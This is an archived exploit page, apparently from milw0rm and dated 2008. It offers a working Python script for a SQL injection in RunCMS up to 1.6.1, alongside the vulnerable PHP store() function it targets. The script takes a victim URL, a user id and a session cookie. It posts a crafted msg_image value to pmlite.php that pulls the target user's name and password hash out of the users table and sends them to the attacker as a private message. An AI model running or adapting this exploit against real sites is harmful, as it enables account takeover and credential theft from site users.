<html><head><title>RunCMS <= 1.6.1 (msg_image) SQL Injection Exploit</title></head><pre>
#!/usr/bin/python
&quot;&quot;&quot;
#=================================================================================================#
#                     ____            __________         __             ____  __                  #
#                    /_   | ____     |__\_____  \  _____/  |_          /_   |/  |_                #
#                     |   |/    \    |  | _(__  &lt;_/ ___\   __\  ______  |   \   __\               #
#                     |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |                 #
#                     |___|___|  /\__|  /______  /\___  &gt;__|            |___||__|                 #
#                              \/\______|      \/     \/                                          #
#=================================================================================================#
#                                     This is a public Exploit                                    #
#=================================================================================================#
#  	           		           Runcms &lt;= 1.6.1                                        #
#                                    Sql Injection Vulnerability                                  #
#=================================================================================================#
#                                .-= In memory of our friend rGod =-.                        	  #
#====================================#===========#====================================#===========#
# Server Configuration Requirements  #           # Some Information                   #           #
#====================================#		 #====================================#           #
#                                                #                                                #
# magic_quotes_gpc = 0                           #  Vendor:   runcms.org	                  #
#                                                #  Author:   The:Paradox                         #
#================================================#  Severity: Moderately Critical                 #
#                                                #                                                #
# Uff... I have to find something to put here... #  Proud To Be Italian.                          #
#                                                #                                                #
#====================================#===========#================================================#
# Proof Of Concept / Bug Explanation #                                                            #
#====================================#                                                            #
#												  #
# This time i'm really too lazy to write a long PoC.						  #
# $msg_image (but also $msg_attachment) is unproperly checked when calling store()	          #
# function (modules/messages/class/pm.class.php) 						  #
# Sql injection in insert syntax (whatever I am not using blind attack). Prefix knowledge needed. #
#												  #
#=================================================================================================#

[modules/messages/class/pm.class.php]


64. 	function store() {
65.	global $db, $upload;
66.
67.	if ( !$this-&gt;isCleaned() ) {
68.		if ( !$this-&gt;cleanVars() ) {
69.			return false;
70.		}
71.	}
72.	
73.	foreach ( $this-&gt;cleanVars as $k=&gt;$v ) {
74.		$$k = $v;
75.	}
76.	
77.	if ( empty($msg_id) ) {
78.	
79.		$msg_id = $db-&gt;genId($db-&gt;prefix('private_msgs').'_msg_id_seq');
80.		
81.		$sql = &quot;
82.			INSERT INTO &quot;.$db-&gt;prefix(&quot;private_msgs&quot;).&quot; SET
83.			msg_id=&quot;.intval($msg_id).&quot;,
84.			msg_image='$msg_image',
85.			msg_attachment='$msg_attachment',
86.			subject='$subject',
87.			from_userid=&quot;.intval($from_userid).&quot;,
88.			to_userid=&quot;.intval($to_userid).&quot;,
89.			msg_time=&quot;.time().&quot;,
90.			msg_text='$msg_text',
91.			read_msg=0,
92.			type='&quot;.$type.&quot;',
93.			allow_html=&quot;.intval($allow_html).&quot;,
94.			allow_smileys=&quot;.intval($allow_smileys).&quot;,
95.			allow_bbcode=&quot;.intval($allow_bbcode).&quot;,
96.			msg_replay=&quot;.intval($msg_replay).&quot;&quot;;
97.	}
98.
99.	if ( !$result = $db-&gt;query($sql) ) {
100.		$this-&gt;errors[] = _NOTUPDATED;
101.		return false;
102.	}
103.
104.	return true;
105.	}
												  
#=================================================================================================#
# There are other vulnerabilities in this CMS. Find them by yourself. 		                  #
#=================================================================================================#
# Use this at your own risk. You are responsible for your own deeds.                              #
#=================================================================================================#
#                                      Python Exploit Starts                                      #
#=================================================================================================#
&quot;&quot;&quot;

import urllib, urllib2
from sys import argv, exit


main = &quot;&quot;&quot;
#================================================================#
#  	                  Runcms &lt;= 1.6.1                        #
#                   Sql Injection Vulnerability                  #
#                     Discovered By The:Paradox                  #
#                                                                #
#                 rGod is still alive in our hearts              #
#                                                                #
# Usage:                                                         #
#  ./homerun [Target+path] [TargetUid] [ValidUserCookie]         #
#  ./homerun --help (to print an example)                        #
#================================================================#
&quot;&quot;&quot;

prefix = &quot;runcms_&quot;

if len(argv)&gt;=2 and argv[1] == &quot;--help&quot;: 
	print &quot;\nuser@linux:~/Desktop$ ./homerun http://localhost/web/runcms/ 1 rc_sess=a%3A3%3A%7Bi%3A0%3Bi%3A3%3Bi%3A1%3Bs%3A40%3A%228b394462d67198707aea362098001610d35687ff%22%3Bi%3A2%3Bi%3A1212933002%3B%7D;\n\n&quot; + main + &quot;\n\n[.] Exploit Starting.\n[+] Sending HTTP Request...\n[+] A message with username and password of user with id 1 has been sent to user with id 3.\n -= The:Paradox =-&quot;
else: print main


if len(argv)&lt;=3:	exit()
else:   print &quot;[.] Exploit Starting.&quot;


host = argv[1]
tuid = argv[2]
cookie = argv[3]
try: uid = cookie.split(&quot;a%3A3%3A%7Bi%3A0%3Bi%3A&quot;)[1].split(&quot;%3Bi%3A1%3Bs%3A40%3A%&quot;)[0]
except: exit(&quot;[-] Invalid cookie&quot;)
sql = &quot;icon12.gif', msg_attachment='', subject='Master, all was done.', from_userid=&quot; + str(uid) + &quot;, to_userid=&quot; + str(uid) + &quot;, msg_time=0, msg_text=concat('Master, password hash for ',(select uname from &quot; + prefix + &quot;users where uid=&quot; + tuid + &quot;),' is ',(select pass from &quot; + prefix + &quot;users where uid=&quot; + tuid + &quot;)), read_msg=0, type='1', allow_html=0, allow_smileys=1, allow_bbcode=1, msg_replay=0/*&quot;


print &quot;[+] Sending HTTP Request...&quot;
values = {'subject' : 'Master attack failed.',
	  'message' : 'Probably mq = 1 or system patched.',
	  'allow_html' : 0,
	  'allow_smileys' : 1,
	  'allow_bbcode' : 0,
	  'msg_replay' : 1,
          'submit' : '1',
	  'msg_image' : sql,
          'to_userid' : uid }
headers = {'Cookie' : cookie, 
	   'Content-Type' : 'application/x-www-form-urlencoded'}
req = urllib2.Request(host + &quot;/modules/messages/pmlite.php&quot;, urllib.urlencode(values), headers)
response = urllib2.urlopen(req)


if response.read().find('Your message has been posted.') != -1: print &quot;[+] A message with username and password of user with id &quot; + tuid + &quot; has been sent to user with id &quot; + uid + &quot;.\n -= The:Paradox =-&quot;
else: print &quot;[-] Unable to send message&quot;

# milw0rm.com [2008-05-08]</pre></html>